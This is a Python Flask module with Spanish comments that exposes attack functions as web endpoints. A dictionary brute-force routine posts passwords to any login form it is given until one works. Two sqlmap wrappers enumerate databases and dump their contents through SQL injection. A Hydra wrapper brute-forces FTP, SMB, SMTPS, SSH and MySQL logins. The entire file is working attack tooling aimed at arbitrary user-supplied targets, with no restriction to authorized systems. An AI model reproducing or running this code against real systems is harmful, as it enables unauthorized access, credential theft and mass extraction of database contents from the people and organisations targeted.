# Modulo Flask que maneja la lógica de ataques.
import os
import requests
import subprocess

from flask import request, jsonify


def bruteforce():
    """
    Realiza un ataque de fuerza bruta en un formulario web.
    - Lee datos del cliente: URL, usuario, atributos de campos, etc.
    - Valida y carga un archivo de diccionario con posibles contraseñas.
    - Envia solicitudes POST simulando inicios de sesión.
    - Retorna éxito si encuentra credenciales válidas o un mensaje de error.
    """
    try:
        # Obtener datos del cliente
        data = request.get_json()  # Cambiar a `get_json` para asegurar el formato
        if not data:
            return jsonify({"success": False, "message": "No se recibieron datos válidos."}), 400

        # Recuperar y validar parámetros
        login_url = data.get("login_path")
        username = data.get("username")
        user_field = data.get("user_field", "username")
        pass_field = data.get("pass_field", "password")
        error_message = data.get("error_message", "Invalid credentials")
        target = data.get("target")

        if not login_url or not username or not target:
            return jsonify({"success": False, "message": "Faltan datos obligatorios (login_path, username o target)."}), 400

        # Construir URL completa
        full_url = f"http://{target}{login_url}"

        # Validar existencia del diccionario
        dictionary_path = os.path.join("dictionaries", "passwords.txt")
        if not os.path.exists(dictionary_path):
            return jsonify({"success": False, "message": "Archivo de diccionario no encontrado."}), 400

        # Leer contraseñas del diccionario
        with open(dictionary_path, "r") as file:
            passwords = file.readlines()
            if not passwords:
                return jsonify({"success": False, "message": "El archivo de diccionario está vacío."}), 400

        # Ejecutar ataque de fuerza bruta
        for password in passwords:
            password = password.strip()
            form_data = {user_field: username, pass_field: password}

            # Enviar solicitud POST
            response = requests.post(full_url, data=form_data)

            # Verificar si la contraseña es correcta
            if error_message not in response.text:
                return jsonify({
                    "success": True,
                    "username": username,
                    "password": password,
                    "message": "¡Contraseña encontrada!"
                }), 200

        # Contraseña no encontrada
        return jsonify({"success": False, "message": "No se encontró ninguna contraseña válida."}), 200

    except requests.exceptions.RequestException as e:
        # Errores de conexión
        return jsonify({"success": False, "message": f"Error de conexión: {str(e)}"}), 500

    except Exception as e:
        # Capturar cualquier otro error
        return jsonify({"success": False, "message": f"Error inesperado: {str(e)}"}), 500

def sqlmap_attack():
    """
    Ejecuta un análisis de SQL Injection usando SQLMap.
    - Recibe URL y el atributo objetivo.
    - Ejecuta SQLMap para listar bases de datos disponibles.
    - Extrae y devuelve nombres de bases de datos encontrados en la salida.
    """
    try:
        # Obtener datos del cliente
        data = request.get_json()
        if not data:
            return jsonify({"success": False, "error": "Datos no recibidos."}), 400

        url = data.get("url")
        atributo = data.get("atributo")

        # Validar datos recibidos
        if not url or not atributo:
            return jsonify({"success": False, "error": "Faltan parámetros obligatorios (URL o atributo)."}), 400

        # Construir el comando para ejecutar SQLMap
        command = [
            "sqlmap",
            "-u", f"{url}?{atributo}=1",
            "--batch",
            "--dbs",
            "--fresh-queries"
        ]

        # Ejecutar el comando y capturar la salida
        result = subprocess.run(command, text=True, capture_output=True)

        if result.returncode == 0:
            # Analizar la salida para extraer nombres de bases de datos
            output = result.stdout
            databases = []

            # Buscar y extraer bases de datos reales
            capturing = False
            for line in output.splitlines():
                line = line.strip()
                if line.startswith("available databases"):
                    capturing = True  # Inicia captura después de esta línea
                    continue
                if capturing:
                    # Bases de datos comienzan con "[*] ", las añadimos y detenemos al llegar a otra cosa
                    if line.startswith("[*] "):
                        databases.append(line.split("[*] ")[1].strip())
                    else:
                        break  # Termina captura si ya no es una base de datos

            # Si se encontraron bases de datos, devolverlas
            if databases:
                return jsonify({"success": True, "databases": databases}), 200
            else:
                return jsonify({"success": False, "error": "No se encontraron bases de datos."}), 200

        else:
            # Manejar errores de ejecución de SQLMap
            return jsonify({"success": False, "error": result.stderr}), 500

    except Exception as e:
        # Manejo de errores generales
        return jsonify({"success": False, "error": str(e)}), 500

def sqlmap_execute_database():
    """
    Expande el ataque SQLMap a una base de datos específica.
    - Recibe URL, atributo y nombre de la base de datos.
    - Extrae y devuelve datos usando SQLMap.
    """
    try:
        # Obtener datos del cliente
        data = request.get_json()
        if not data:
            return jsonify({"success": False, "error": "Datos no recibidos."}), 400

        url = data.get("url")
        atributo = data.get("atributo")
        database = data.get("database")

        # Validar datos recibidos
        if not url or not atributo or not database:
            return jsonify({"success": False, "error": "Faltan parámetros obligatorios (URL, atributo o base de datos)."}), 400

        # Construir el comando para SQLMap
        command = [
            "sqlmap",
            "-u", f"{url}?{atributo}=1",
            "--batch",
            "-D", database,
            "--dump"
        ]

        # Ejecutar el comando
        result = subprocess.run(command, text=True, capture_output=True)

        if result.returncode == 0:
            # Filtrar la salida
            output_lines = result.stdout.splitlines()
            filtered_lines = []
            show_lines = False  # Flag para empezar a capturar después de ver la primera línea con "Database"

            for line in output_lines:
                line = line.strip()
                if "Database" in line:
                    show_lines = True  # Activar flag cuando se encuentre la primera línea con "Database"
                if show_lines and (line.startswith("+") or line.startswith("|") or line.startswith("Database") or line.startswith("Table")):
                    filtered_lines.append(line)

            # Unir las líneas filtradas en un solo bloque de texto
            filtered_output = "\n".join(filtered_lines)

            return jsonify({"success": True, "output": filtered_output}), 200
        else:
            return jsonify({"success": False, "error": result.stderr}), 500

    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

def hydra_attack():
    """
    Realiza un ataque de fuerza bruta utilizando Hydra.
    - Recibe el objetivo, tipo de servicio (e.g., FTP, SSH), y usuario.
    - Valida que el diccionario de contraseñas exista.
    - Ejecuta Hydra y devuelve resultados de intento de autenticación.
    """
    try:
        # Obtener datos del cliente
        data = request.get_json()
        if not data:
            return jsonify({"success": False, "error": "Datos no recibidos."}), 400

        target = data.get("target")
        username = data.get("username")
        scan_type = data.get("scanType")

        # Validar datos recibidos
        if not target or not username or not scan_type:
            return jsonify({"success": False, "error": "Faltan parámetros obligatorios (target, username o scanType)."}), 400

        # Definir el formato del comando según el tipo de escaneo
        dictionary_path = os.path.join("dictionaries", "passwords.txt")
        if not os.path.exists(dictionary_path):
            return jsonify({"success": False, "error": "Archivo de diccionario no encontrado."}), 400

        if scan_type == "ftp":
            command = ["hydra", "-l", username, "-P", dictionary_path, f"ftp://{target}"]
        elif scan_type == "smb":
            command = ["hydra", "-l", username, "-P", dictionary_path, target, "smb"]
        elif scan_type == "smtps":
            command = ["hydra", "-l", username, "-P", dictionary_path, "-t", "4", "-s", "465", f"smtps://{target}"]
        elif scan_type == "ssh":
            command = ["hydra", "-l", username, "-P", dictionary_path, target, "ssh"]
        elif scan_type == "mysql":
            command = ["hydra", "-l", username, "-P", dictionary_path, f"mysql://{target}"]
        else:
            return jsonify({"success": False, "error": "Tipo de escaneo no válido."}), 400

        # Ejecutar el comando
        result = subprocess.run(command, text=True, capture_output=True)

        if result.returncode == 0:
            return jsonify({"success": True, "output": result.stdout}), 200
        else:
            return jsonify({"success": False, "error": result.stderr}), 500

    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

